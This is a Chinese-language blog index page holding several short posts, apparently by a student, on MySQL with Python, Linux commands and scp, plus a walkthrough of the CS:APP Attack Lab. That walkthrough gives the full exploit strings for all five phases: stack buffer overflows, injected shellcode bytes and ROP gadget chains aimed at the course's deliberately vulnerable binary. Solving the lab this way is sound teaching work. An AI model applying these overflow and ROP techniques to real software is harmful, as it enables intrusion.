<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="lagrange&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="lagrange&#39;s blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="lagrange">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>lagrange's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lagrange's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">what's dead may never die</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">6</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/24/python%E4%B8%8Emysql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/24/python%E4%B8%8Emysql/" class="post-title-link" itemprop="url">python与mysql</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-24 10:47:34" itemprop="dateCreated datePublished" datetime="2019-11-24T10:47:34Z">2019-11-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 00:49:44" itemprop="dateModified" datetime="2021-01-21T00:49:44Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li><p> mysql命令行的使用 注意以管理员身份运行 net start mysql80命令 安装时注意windows service name 是 mysql80不能写mysql 进入C:\Program Files\MySQL\MySQL Server 8.0\bin该路径操作cd “C:\Program Files\MySQL\MySQL Server 8.0\bin”不要一步一步来 .\mysql -u root -p –i-am-a-dummy 不怕手作删库跑路可以不写–i-am-a-dummy 操作完成 net stop mysql80</p>
</li>
<li><p>遇到的Unread result found异常 All that was required was for buffered to be set to true! cursor = cnx.cursor(buffered=True) The reason is that without a buffered cursor, the results are “lazily” loaded, meaning that “fetchone” actually only fetches one row from the full result set of the query. When you will use the same cursor again, it will complain that you still have n-1 results (where n is the result set amount) waiting to be fetched. However when you use a buffered cursor the connector fetches ALL rows behind the scenes and you just take one from the connector so the mysql db won’t complain. Hope it helps. 来自 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/29772337/python-mysql-connector-unread-result-found-when-using-fetchone">https://stackoverflow.com/questions/29772337/python-mysql-connector-unread-result-found-when-using-fetchone</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my = mysql.connector.connect(user=<span class="string">&quot;username&quot;</span>,</span><br><span class="line">                         password=<span class="string">&quot;123456&quot;</span>,</span><br><span class="line">                         charset=<span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">                         buffered=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p> 记得buffered=True要不然从数据中读取太多数据，又不全用会导致这个异常，但不用异常捕获是看不到的，只会直接退出不报错。</p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/24/attack-lab%E5%AE%9E%E9%AA%8C%E6%94%BB%E7%95%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/24/attack-lab%E5%AE%9E%E9%AA%8C%E6%94%BB%E7%95%A5/" class="post-title-link" itemprop="url">Attack Lab实验攻略</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-24 10:29:50" itemprop="dateCreated datePublished" datetime="2019-11-24T10:29:50Z">2019-11-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 00:46:04" itemprop="dateModified" datetime="2021-01-21T00:46:04Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/bupt%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/" itemprop="url" rel="index"><span itemprop="name">bupt学习资源汇总</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在通过了Attack Lab的五个试验后，写一篇博客，总结一下实验当中遇到的问题和解决方案，下面一个关卡一个关卡的说</p>
<ol>
<li><p>phase1 phase1应该是最简单的一关了先汇编getbuf的汇编代码我们可以看到第一条指令为 sub $0x28,%rsp ,即向getbuf函数分配了长度为40个字节的空间，要求调用touch1，故构造攻击字符串如下所示</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;从开头到这一共有40个字节，刚好使缓冲区溢出，将返回地址覆盖为touch1的地址</span><br><span class="line">1d 18 40 00 00 00 00 00&#x2F;&#x2F;touch1的地址，注意使用小端法</span><br></pre></td></tr></table></figure>

<p> phase1主要是熟悉实验操作，在写完字符串后使用 vim attck1.txt将字符串复制进去，wq退出 ./hex2raw &lt; attack1.txt &gt; attackstring1.txt将其转换为字符串 最后。./ctarget -i attackstring1.txt完成实验</p>
</li>
<li><p>phase2 这关要求写汇编代码，要求输入cookie值，则需要将cookie放入寄存器%rdi中再调用touch2 Getbuf返回地址被篡改为缓存区写入命令的地址 编写汇编码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x29110ecb（cookie值）,%rdi&#x2F;&#x2F;把cookie值作为参数传入</span><br><span class="line">pushq $0x401849&#x2F;&#x2F;把touch2的地址压入栈中</span><br><span class="line">ret&#x2F;&#x2F;返回调用touch2</span><br></pre></td></tr></table></figure>

<p> 使用下面一系列命令得到汇编代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim attack2obj.s</span><br><span class="line">gcc -c attack2obj.s</span><br><span class="line">objdump -d attack2obj.o</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">0:   48 c7 c7 cb 0e 11 29    mov    $0x29110ecb,%rdi</span><br><span class="line">7:   68 49 18 40 00          pushq  $0x401849</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p> 构造攻击代码为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 cb 0e 11 29 68&#x2F;&#x2F;通过之后的栈顶指针返回到这执行</span><br><span class="line">49 18 40 00 c3 00 00 00&#x2F;&#x2F;就是反汇编的汇编代码抄下来</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;指令编码无需小端法</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;抄完汇编代码随便填，直到这溢出</span><br><span class="line">a8 1d 66 55 00 00 00 00&#x2F;&#x2F;栈顶指针的值，需要使用gdb监视</span><br></pre></td></tr></table></figure>
</li>
<li><p>phase3 观察源代码要求将cookie以字符的方式输入与之匹配，传入的是cookie的指针，那么需要将cookie存在栈中的某个地方调用hexmatch可能会把之前栈里的东西给抹了，所以不能放在getbuf的栈里，放在其父栈里比较合适</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 d8 1d 66 55 68</span><br><span class="line">5a 19 40 00 c3</span><br><span class="line">&#x2F;&#x2F;执行</span><br><span class="line">&#x2F;&#x2F;movq $0x55661dd8,%rdi把cookie地址给放到%rdi里</span><br><span class="line">&#x2F;&#x2F;pushq $0x40195a把touch3压到栈里</span><br><span class="line">&#x2F;&#x2F;ret返回调用touch3</span><br><span class="line">00 00 00</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;从00开始填充剩下没用的缓冲区</span><br><span class="line">a8 1d 66 55 00 00 00 00&#x2F;&#x2F;getbuf栈地址结束跳转执行汇编缓冲区内的汇编代码</span><br><span class="line">32 39 31 31 30 65 63 62&#x2F;&#x2F;以ascii码储存cookie值，这是字节数组，本来小端就应该是顺序写</span><br></pre></td></tr></table></figure>

<p> 4.phase4 这个关卡要求在start_farm到end_farm之间寻找代码来完成注入攻击在程序中采用了随机栈需要拼凑代码，在汇编代码中找到两个gadget为</p>
<p> ``` 946 0000000000401a1f &lt;addval_350&gt;: 947 401a1f: 8d 87 cd 0e b7 58 lea 0x58b70ecd(%rdi),%eax// pop rax 948 401a25: c3 950 0000000000401a26 &lt;setval_464&gt;: 951 401a26: c7 07 18 48 89 c7 movl $0xc7894818,(%rdi) //rax-&gt;rdi 952 401a2c: c3 retq</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造攻击代码如下</span><br></pre></td></tr></table></figure>

<p> 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33//使缓冲区溢出 24 1a 40 00 00 00 00 00// Pop %rax cb 0e 11 29 00 00 00 00//cookie值存到%rax中，即待pop的值 29 1a 40 00 00 00 00 00// Mov %rax，%rdi 49 18 40 00 00 00 00 00//调用touch2</p>
</li>
<li><p>phase5 找到的汇编代码如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1034 0000000000401ab0 &lt;addval_250&gt;:</span><br><span class="line">1035   401ab0:   8d 87         48 89 e0 c3       lea    -0x3c1f76b8(%rdi),%eax&#x2F;&#x2F;rsp-&gt;rax  401ab2</span><br><span class="line">1036   401ab6:   c3                      retq</span><br><span class="line">950 0000000000401a26 &lt;setval_464&gt;:</span><br><span class="line">951   401a26:   c7 07 18      48 89 c7       movl   $0xc7894818,(%rdi)&#x2F;&#x2F;rax-&gt;rdi           401a29</span><br><span class="line">952   401a2c:   c3                      retq</span><br><span class="line">946 0000000000401a1f &lt;addval_350&gt;:</span><br><span class="line">947   401a1f:   8d 87 cd 0e b7 58       lea    0x58b70ecd(%rdi),%eax&#x2F;&#x2F; pop rax         401a24</span><br><span class="line">948   401a25:   c3</span><br><span class="line">1030 0000000000401aaa &lt;getval_177&gt;:</span><br><span class="line">1031   401aaa:   b8 89 c1 20 c0          mov    $0xc020c189,%eax&#x2F;&#x2F;eax-&gt;ecx          401aab</span><br><span class="line">1032   401aaf:   c3                      retq</span><br><span class="line">1014 0000000000401a8f &lt;getval_110&gt;:</span><br><span class="line">1015   401a8f:   b8 89 ca 84 c0          mov    $0xc084ca89,%eax&#x2F;&#x2F;ecx-&gt;edx          401a90</span><br><span class="line">1016   401a94:   c3                      retq</span><br><span class="line">1086 0000000000401b09 &lt;getval_428&gt;:</span><br><span class="line">1087   401b09:   b8 ee 89 d6 c3          mov    $0xc3d689ee,%eax&#x2F;&#x2F;edx-&gt;esi         401b0b</span><br><span class="line">1088   401b0e:   c3</span><br><span class="line">958 0000000000401a33 &lt;add_xy&gt;:</span><br><span class="line">959   401a33:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax&#x2F;&#x2F;lea    (%rdi,%rsi,1),%rax    401a33</span><br><span class="line">960   401a37:   c3                      retq</span><br><span class="line">950 0000000000401a26 &lt;setval_464&gt;:</span><br><span class="line">951   401a26:   c7 07 18 48 89 c7       movl   $0xc7894818,(%rdi)    &#x2F;&#x2F;rax-rdi        401a29</span><br><span class="line">952   401a2c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p> 构造如下字符串，至此实验完成</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">b2 1a 40 00 00 00 00 00&#x2F;&#x2F;rsp-&gt;rax</span><br><span class="line">29 1a 40 00 00 00 00 00&#x2F;&#x2F;rax-&gt;rdi</span><br><span class="line">24 1a 40 00 00 00 00 00&#x2F;&#x2F; pop rax</span><br><span class="line">48 00 00 00 00 00 00 00&#x2F;&#x2F;bias</span><br><span class="line">ab 1a 40 00 00 00 00 00&#x2F;&#x2F;eax-&gt;ecx</span><br><span class="line">90 1a 40 00 00 00 00 00&#x2F;&#x2F;ecx-&gt;edx</span><br><span class="line">0b 1b 40 00 00 00 00 00&#x2F;&#x2F;edx-&gt;esi</span><br><span class="line">33 1a 40 00 00 00 00 00&#x2F;&#x2F;lea    (%rdi,%rsi,1),%rax</span><br><span class="line">29 1a 40 00 00 00 00 00&#x2F;&#x2F;rax-rdi</span><br><span class="line">5a 19 40 00 00 00 00 00&#x2F;&#x2F;touch3</span><br><span class="line">32 39 31 31 30 65 63 62&#x2F;&#x2F;cookie</span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/09/%E5%85%B3%E4%BA%8Ebupt%E8%B5%84%E6%BA%90%E7%9A%84%E8%AF%B4%E6%98%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/09/%E5%85%B3%E4%BA%8Ebupt%E8%B5%84%E6%BA%90%E7%9A%84%E8%AF%B4%E6%98%8E/" class="post-title-link" itemprop="url">关于BUPT资源的说明</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-09 11:58:29" itemprop="dateCreated datePublished" datetime="2019-11-09T11:58:29Z">2019-11-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 00:46:04" itemprop="dateModified" datetime="2021-01-21T00:46:04Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/bupt%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/" itemprop="url" rel="index"><span itemprop="name">bupt学习资源汇总</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上方BUPT资源的标签处，你可以转到我一个GitHub的仓库，里面包含了很多的资料，有些文件太大GitHub不允许上传，虽然有一些关于这个问题的解决方案，但毕竟会对下载的用户造成不必要的麻烦。所以剩下的内容以百度云链接的形式给出 链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1eUL6GhrOrc29VWwnBlUv1A">https://pan.baidu.com/s/1eUL6GhrOrc29VWwnBlUv1A</a> 提取码: tpb9 复制这段内容后打开百度网盘手机App，操作更方便哦</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/09/%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/09/%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" class="post-title-link" itemprop="url">使用服务器的过程中遇到的问题，及解决方案</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-08 21:19:50" itemprop="dateCreated datePublished" datetime="2019-11-08T21:19:50Z">2019-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 00:46:04" itemprop="dateModified" datetime="2021-01-21T00:46:04Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">Linux服务器相关</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>与上一篇一样，这篇主要记录使用服务器中遇到的问题以及问题是如何被解决的。<strong>本文长期更新</strong></p>
<ol>
<li> scp作为与服务器上传下载文件的命令非常实用 如上传下载服务器中的文件到电脑 但一次在使用过程中爆出<em>No such file or directory</em> 的错误 <code>scp hostname@ip:serverpath computer_path hostname@ip:serverpath&#39;s password: computer_path: No such file or directory</code> 解决方法：是在本地终端使用scp命令而不是登录了远程服务端再使用，本操作需要退出服务器终端</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/09/linux%E7%B3%BB%E7%BB%9F%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/09/linux%E7%B3%BB%E7%BB%9F%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">linux系统及其服务器相关命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-08 21:11:03" itemprop="dateCreated datePublished" datetime="2019-11-08T21:11:03Z">2019-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 00:46:04" itemprop="dateModified" datetime="2021-01-21T00:46:04Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">Linux服务器相关</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>由于是现用服务器搭网站在这个过程中了解到了越来越多的linux命令，记录下来，防止遗忘， <strong>本文长期更新</strong></p>
<ol>
<li><p> 解压与压缩 压缩：tar -cvf XXX.tar path 解压：tar -xvf XXX.tar</p>
</li>
<li><p>使用du命令查看文件或文件夹的磁盘使用空间 –max-depth 用于指定深入目录的层数。如要查看当前目录已经使用总大小及当前目录下一级文件或文件夹各自使用的总空间大小， 输入du -h –max-depth=1即可。</p>
<p> 如要查看当前目录已使用总大小可输入：du -h –max-depth=0</p>
</li>
<li><p> 有关apache服务： 一、Start Apache 2 Server /启动apache服务 /etc/init.d/apache2 start 需要root权限 or $ sudo /etc/init.d/apache2 start 二、 Restart Apache 2 Server /重启apache服务 /etc/init.d/apache2 restart 需要root权限 or $ sudo /etc/init.d/apache2 restart 三、Stop Apache 2 Server /停止apache服务 /etc/init.d/apache2 stop 需要root权限 or $ sudo /etc/init.d/apache2 stop</p>
</li>
<li><p>服务器上部署python程序使即使退出ssh，程序仍能继续运行</p>
<p> 1.nohup python3 -u test.py &gt;test.log 2&gt;&amp;1 &amp;</p>
<p> 2.回车</p>
<p> 3.输入exit命令退出终端</p>
<p> 4.关闭shell 注意：不能直接退出终端 其中，</p>
<ol>
<li><p> 最后一个“&amp;”表示后台运行程序</p>
</li>
<li><p> “nohup” 表示程序不被挂起</p>
</li>
<li><p> “python”表示执行python代码</p>
</li>
<li><p> “-u”表示不启用缓存，实时输出打印信息到日志文件（如果不加-u，则会导致日志文件不会实时刷新代码中的print函数的信息）</p>
</li>
<li><p> “test.py”表示python的源代码文件</p>
</li>
<li><p> “test.log”表示输出的日志文件</p>
</li>
<li><p> “&gt;”表示将打印信息重定向到日志文件</p>
</li>
